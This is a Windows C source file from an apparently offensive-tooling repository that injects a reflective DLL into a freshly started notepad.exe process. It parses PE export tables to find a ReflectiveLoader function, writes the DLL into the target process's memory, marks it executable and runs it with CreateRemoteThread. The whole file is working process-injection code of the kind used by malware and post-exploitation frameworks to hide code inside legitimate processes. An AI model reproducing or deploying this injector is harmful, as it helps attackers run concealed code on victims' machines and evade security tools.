#include <stdio.h>
#include <windows.h>

#define DEREF(name) *(UINT_PTR *)(name)
#define DEREF_64(name) *(DWORD64 *)(name)
#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_16(name) *(WORD *)(name)
#define DEREF_8(name) *(BYTE *)(name)

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress, BOOL is64)
{
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
    PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;

    if (is64)
    {
        pNtHeaders64 = (PIMAGE_NT_HEADERS64)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

        pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);

        if (dwRva < pSectionHeader[0].PointerToRawData)
            return dwRva;

        for (wIndex = 0; wIndex < pNtHeaders64->FileHeader.NumberOfSections; wIndex++)
        {
            if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
                return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
        }
    }
    else
    {
        pNtHeaders32 = (PIMAGE_NT_HEADERS32)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

        pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);

        if (dwRva < pSectionHeader[0].PointerToRawData)
            return dwRva;

        for (wIndex = 0; wIndex < pNtHeaders32->FileHeader.NumberOfSections; wIndex++)
        {
            if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
                return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
        }
    }

    return 0;
}

DWORD GetReflectiveLoaderOffset(VOID *lpReflectiveDllBuffer, LPCSTR cpReflectiveLoaderName)
{
    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;
    BOOL is64 = 0;

    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    // process a PE file based on its architecture
    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
    {
        is64 = FALSE;
        // uiNameArray = the address of the modules export directory entry
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
    {
        is64 = TRUE;
        // uiNameArray = the address of the modules export directory entry
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else
    {
        return 0;
    }

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress, is64);

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress, is64);

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress, is64);

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress, is64);

    // test if we are importing by name or by ordinal...
    if ((((DWORD_PTR)cpReflectiveLoaderName) >> 16) == 0)
    {
        // import by ordinal...

        // use the import ordinal (- export ordinal base) as an index into the array of addresses
        uiAddressArray += ((IMAGE_ORDINAL((DWORD)(DWORD_PTR)cpReflectiveLoaderName) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

        // resolve the address for this imported function
        return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress, is64);
    }

    // import by name...
    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // loop through all the exported functions to find the ReflectiveLoader
    while (dwCounter--)
    {
        char *cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress, is64));

        if (strstr(cpExportedFunctionName, cpReflectiveLoaderName) != NULL)
        {
            // get the File Offset for the array of addresses
            uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress, is64);

            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // return the File Offset to the ReflectiveLoader() functions code...
            return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress, is64);
        }
        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

int main()
{
    // // setup

    PROCESS_INFORMATION pi;
    STARTUPINFOA Startup;
    ZeroMemory(&Startup, sizeof(Startup));
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
    WaitForSingleObject(pi.hProcess, 1 * 1000);

    // //

    HANDLE hFile = CreateFileA("Z:\\git\\offensive_c\\bin\\reflective_dll.x64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD64 dwLength = GetFileSize(hFile, NULL);
    LPVOID lpFileContent = HeapAlloc(GetProcessHeap(), 0, dwLength);
    ReadFile(hFile, lpFileContent, dwLength, NULL, NULL);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);

    // find offset of reflective loader function offset in memory

    DWORD64 dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpFileContent, "ReflectiveLoader");
    printf("offset %llx\n", dwReflectiveLoaderOffset);

    LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpFileContent, dwLength, NULL);

    VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, NULL);

    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
    printf("reflective loader %llx\n", lpReflectiveLoader);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, (DWORD_PTR)NULL, NULL);

	WaitForSingleObject( hThread, -1 );

    printf("done.");

    return 0;
}